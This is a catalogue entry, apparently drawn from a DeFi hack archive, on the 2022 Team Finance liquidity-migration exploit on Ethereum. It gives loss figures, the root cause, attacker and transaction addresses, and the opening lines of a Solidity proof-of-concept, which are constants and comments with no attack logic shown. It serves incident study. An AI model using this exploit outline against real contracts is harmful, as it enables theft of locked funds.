# [?] Team Finance - Liquidity Migration Exploit

## Summary
Severity: Unknown
Chain: Ethereum
Component: TeamFinance
Published: 2022-10-27
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/TeamFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: Multiple Tokens ~$15.8M US$

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : Multiple Tokens ~$15.8M US$
// Root Cause : Lack of check function parameter legitimate
// Attacker : 0x161cebb807ac181d5303a4ccec2fc580cc5899fd
// Attack Contract : 0xcff07c4e6aa9e2fec04daaf5f41d1b10f3adadf4
// Vulnerable Contract : https://etherscan.io/address/0x48d118c9185e4dbafe7f3813f8f29ec8a6248359#code#L1535
// Attack Tx : https://etherscan.io/tx/0xb2e3ea72d353da43a2ac9a8f1670fd16463ab370e563b9b5b26119b2601277ce
//     Pre-work1: lockToken()
//       txId: https://etherscan.io/tx/0xe8f17ee00906cd0cfb61671937f11bd3d26cdc47c1534fedc43163a7e89edc6f
//     Pre-work2: extendLockDuration()
//       id 15324: https://etherscan.io/tx/0x2972f75d5926f8f948ab6a0cabc517a05f0da5b53e20f670591afbaa501aa436
//       id 15325: https://etherscan.io/tx/0xec75bb553f50af37f8dd8f4b1e2bfe4703b27f586187741b91db770ad9b230cb
//       id 15326: https://etherscan.io/tx/0x79ec728612867b3d82c0e7401e6ee1c533b240720c749b3968dea1464e59b2c4
//       id 15327: https://etherscan.io/tx/0x51185fb580892706500d3b6eebb8698c27d900618021fb9b1797f4a774fffb04
//
// @Analysis
// Team Finance Official : https://twitter.com/TeamFinance_/status/1585770918873542656
// PeckShield : https://twitter.com/peckshield/status/1585587858978623491
// Solid Group : https://twitter.com/solid_group_1/status/1585643249305518083
// Beiosin Alert : https://twitter.com/BeosinAlert/status/1585578499125178369

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant LockToken = 0xE2fE530C047f2d85298b07D9333C05737f1435fB;

// Token address
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant caw = 0xf3b9569F82B18aEf890De263B84189bd33EBe452;
address constant tsuka = 0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/TeamFinance_exp.sol_
